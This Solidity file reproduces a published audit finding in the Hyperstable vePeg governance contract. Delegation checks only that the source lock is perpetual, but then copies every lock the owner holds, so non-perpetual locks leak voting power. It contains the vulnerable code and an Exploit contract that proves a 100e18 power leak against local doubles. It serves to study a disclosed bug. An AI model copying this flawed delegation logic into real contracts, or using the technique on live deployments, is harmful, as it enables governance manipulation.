// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Hyperstable finding 57824 (H-03):
// "Non-perpetual locks gaining extra delegation power".
//
// Real audited source (the vulnerable delegation code is reproduced VERBATIM,
// the vulnerable line is marked @>):
//   protocol Hyperstable
//   file     src/governance/vePeg.sol
//   fns      vePeg._delegate  and  vePeg._moveAllDelegates
//   report   github.com/pashov/audits/blob/master/team/md/Hyperstable-security-review_2025-03-19.md
//   src      embedded — the finding's embedded ```solidity snippets ARE the
//            verbatim audited source; the `--- SNIPPED ---` gaps are faithfully
//            reconstructed from the standard Solidly/Velodrome ve-NFT delegation
//            code this contract is forked from.
//
// Root cause: `_delegate(_from, _to)` requires the SOURCE token `_from` to be
// perpetually locked (`require(currentLock.perpetuallyLocked == true, ...)`),
// intending that only perpetual locks carry delegation power. But delegation is
// then performed at the ADDRESS level via `_moveAllDelegates`, whose final loop
// copies EVERY tokenId the owner holds — including NON-perpetual locks — into the
// delegatee's checkpoint (the @> line). So passing one perpetual lock through the
// `_from` gate leaks the voting power of ALL of the owner's non-perpetual locks
// to the delegatee, inflating governance/delegation power beyond the intended
// perpetual-only set.
//
// Non-vulnerable dependencies (ERC-721-style ownership bookkeeping, checkpoint
// storage, `_balanceOfNFT`, lock creation) are faithful minimal doubles:
// `_balanceOfNFT` returns the lock amount (the exact ve time-decay is not the
// vulnerable part — token INCLUSION is), and `getVotes` sums the last
// checkpoint's tokenIds exactly like the Solidly source.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Faithful minimal ERC20 double used only to record the leaked (extra)
///      delegation power as a quantified loss marker minted to SINK.
contract MarkerToken {
    string public name = "Extra Delegation Power (Hyperstable H-03)";
    string public symbol = "veLEAK";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — vePeg. `_delegate` and `_moveAllDelegates` are
// reproduced VERBATIM from the audited Hyperstable source.
// ─────────────────────────────────────────────────────────────────────────────
contract vePeg {
    // ── ve-NFT lock accounting (faithful doubles) ──
    struct LockedBalance {
        int128 amount;
        uint256 end;
        bool perpetuallyLocked;
    }

    struct Checkpoint {
        uint256 timestamp;
        uint256[] tokenIds;
    }

    uint256 internal constant MAX_DELEGATES = 1024; // Solidly/Velodrome value
    uint256 internal constant WEEK = 7 * 86400;

    mapping(uint256 => LockedBalance) public locked;
    mapping(uint256 => address) public idToOwner;
    mapping(address => uint256) public ownerToNFTokenCount;
    mapping(address => mapping(uint256 => uint256)) public ownerToNFTokenIdList; // owner => index => tokenId

    mapping(address => address) internal _delegates;
    mapping(address => mapping(uint32 => Checkpoint)) public checkpoints;
    mapping(address => uint32) public numCheckpoints;

    uint256 public tokenId; // monotonic id counter

    event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate);

    // ── faithful minimal lock creation (not the vulnerable path) ──
    /// @notice Mints a ve-NFT lock to `to`. `perpetual` sets `perpetuallyLocked`.
    function createLock(address to, int128 amount, bool perpetual) external returns (uint256) {
        tokenId += 1;
        uint256 _tokenId = tokenId;
        idToOwner[_tokenId] = to;
        uint256 count = ownerToNFTokenCount[to];
        ownerToNFTokenIdList[to][count] = _tokenId;
        ownerToNFTokenCount[to] = count + 1;
        locked[_tokenId] = LockedBalance(amount, perpetual ? 0 : block.timestamp + 4 * 52 * WEEK, perpetual);
        return _tokenId;
    }

    /// @notice Voting balance of a token. Faithful minimal double: returns the
    ///         locked amount (ve time-decay omitted — not the vulnerable part).
    function _balanceOfNFT(uint256 _tokenId) internal view returns (uint256) {
        return uint256(uint128(locked[_tokenId].amount));
    }

    /// @notice Current delegation power of `account` = sum of `_balanceOfNFT`
    ///         over the tokenIds in its latest delegation checkpoint. Verbatim
    ///         Solidly semantics.
    function getVotes(address account) external view returns (uint256 votes) {
        uint32 nCheckpoints = numCheckpoints[account];
        if (nCheckpoints == 0) return 0;
        uint256[] storage _tokenIds = checkpoints[account][nCheckpoints - 1].tokenIds;
        for (uint256 i = 0; i < _tokenIds.length; i++) {
            votes += _balanceOfNFT(_tokenIds[i]);
        }
    }

    function delegates(address account) public view returns (address) {
        return _delegates[account];
    }

    /// @notice Public entrypoint used by the exploit. Auth (owner/approval of
    ///         `_from`) is not the vulnerable concern and is omitted.
    function delegate(uint256 _from, uint256 _to) external {
        _delegate(_from, _to);
    }

    // ── VERBATIM audited source (embedded finding snippet) ──
    function _delegate(uint256 _from, uint256 _to) internal {
        LockedBalance memory currentLock = locked[_from];
        require(currentLock.perpetuallyLocked == true, "Lock is not perpetual");
        // --- SNIPPED (faithfully reconstructed): resolve delegator / delegatee
        //     at the ADDRESS level and record the new address-level delegate ---
        address delegator = idToOwner[_from];
        address currentDelegate = delegates(delegator);
        address delegatee = idToOwner[_to];
        _delegates[delegator] = delegatee;
        emit DelegateChanged(delegator, currentDelegate, delegatee);

        _moveAllDelegates(delegator, currentDelegate, delegatee);
    }

    function _findWhatCheckpointToWrite(address account) internal view returns (uint32) {
        uint256 _timestamp = block.timestamp;
        uint32 _nCheckPoints = numCheckpoints[account];
        if (_nCheckPoints > 0 && checkpoints[account][_nCheckPoints - 1].timestamp == _timestamp) {
            return _nCheckPoints - 1;
        } else {
            return _nCheckPoints;
        }
    }

    // ── VERBATIM audited source (embedded finding snippet) ──
    function _moveAllDelegates(address owner, address srcRep, address dstRep) internal {
        // You can only redelegate what you own
        if (srcRep != dstRep) {
            if (srcRep != address(0)) {
                uint32 srcRepNum = numCheckpoints[srcRep];
                uint256[] storage srcRepOld =
                    srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].tokenIds : checkpoints[srcRep][0].tokenIds;
                uint32 nextSrcRepNum = _findWhatCheckpointToWrite(srcRep);
                uint256[] storage srcRepNew = checkpoints[srcRep][nextSrcRepNum].tokenIds;
                // All the same except what owner owns
                for (uint256 i = 0; i < srcRepOld.length; i++) {
                    uint256 tId = srcRepOld[i];
                    if (idToOwner[tId] != owner) {
                        srcRepNew.push(tId);
                    }
                }

                numCheckpoints[srcRep] = srcRepNum + 1;
            }

            if (dstRep != address(0)) {
                uint32 dstRepNum = numCheckpoints[dstRep];
                uint256[] storage dstRepOld =
                    dstRepNum > 0 ? checkpoints[dstRep][dstRepNum - 1].tokenIds : checkpoints[dstRep][0].tokenIds;
                uint32 nextDstRepNum = _findWhatCheckpointToWrite(dstRep);
                uint256[] storage dstRepNew = checkpoints[dstRep][nextDstRepNum].tokenIds;
                uint256 ownerTokenCount = ownerToNFTokenCount[owner];
                require(dstRepOld.length + ownerTokenCount <= MAX_DELEGATES, "dstRep would have too many tokenIds");
                // All the same
                for (uint256 i = 0; i < dstRepOld.length; i++) {
                    uint256 tId = dstRepOld[i];
                    dstRepNew.push(tId);
                }
                // Plus all that's owned
                for (uint256 i = 0; i < ownerTokenCount; i++) {
                    uint256 tId = ownerToNFTokenIdList[owner][i]; // @> VULN: copies ALL owned locks (perpetual AND non-perpetual) into the delegatee, despite _delegate only gating the single `_from` lock on perpetuallyLocked
                    dstRepNew.push(tId);
                }

                numCheckpoints[dstRep] = dstRepNum + 1;
            }
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: an owner with ONE perpetual lock (100e18) and TWO non-perpetual
// locks (50e18 each) delegates through the perpetual `_from` gate. All three
// locks land in the delegatee's checkpoint, so the delegatee gains 200e18 of
// power — 100e18 of it from non-perpetual locks that should carry NO delegation
// power. The leaked 100e18 is minted to SINK as the quantified harm marker.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant DELEGATEE = 0x000000000000000000000000000000000000DeD1;

    vePeg public vuln;
    MarkerToken public marker;

    uint256 public perpetualPower;    // delegation power the delegatee SHOULD get (perpetual only)
    uint256 public delegatedPower;    // delegation power the delegatee ACTUALLY got
    uint256 public leakedPower;       // extra power from non-perpetual locks

    int128 internal constant PERP_AMT = 100e18;      // perpetual lock
    int128 internal constant NONPERP_AMT = 50e18;    // each non-perpetual lock

    constructor() {
        vuln = new vePeg();            // child nonce 1 (VULN)
        marker = new MarkerToken();    // child nonce 2 (profit/marker)
    }

    function run() external {
        address attacker = address(this);

        // attacker's locks: 1 perpetual + 2 non-perpetual (all self-owned)
        uint256 perpId = vuln.createLock(attacker, PERP_AMT, true);        // tokenId 1 (perpetual)
        vuln.createLock(attacker, NONPERP_AMT, false);                     // tokenId 2 (non-perpetual)
        vuln.createLock(attacker, NONPERP_AMT, false);                     // tokenId 3 (non-perpetual)

        // a token owned by the delegatee, used only to resolve `_to`'s owner
        uint256 toId = vuln.createLock(DELEGATEE, PERP_AMT, true);         // tokenId 4 (delegatee's)

        // delegatee starts with zero delegation power
        require(vuln.getVotes(DELEGATEE) == 0, "delegatee not clean");

        // delegate through the perpetual `_from` gate (perpId is perpetual -> passes)
        vuln.delegate(perpId, toId);

        delegatedPower = vuln.getVotes(DELEGATEE);
        perpetualPower = uint256(uint128(PERP_AMT));           // intended: perpetual lock only
        leakedPower = delegatedPower - perpetualPower;         // extra from non-perpetual locks

        // record the leaked (extra) delegation power as the quantified harm marker
        marker.mint(SINK, leakedPower);

        // harm: the delegatee received the voting power of BOTH non-perpetual locks
        require(delegatedPower == uint256(uint128(PERP_AMT + 2 * NONPERP_AMT)), "all locks not delegated");
        require(delegatedPower == 200e18, "unexpected delegated power");
        require(leakedPower == 100e18, "no extra non-perpetual power leaked");
        require(marker.balanceOf(SINK) == 100e18, "harm marker not recorded");
    }
}
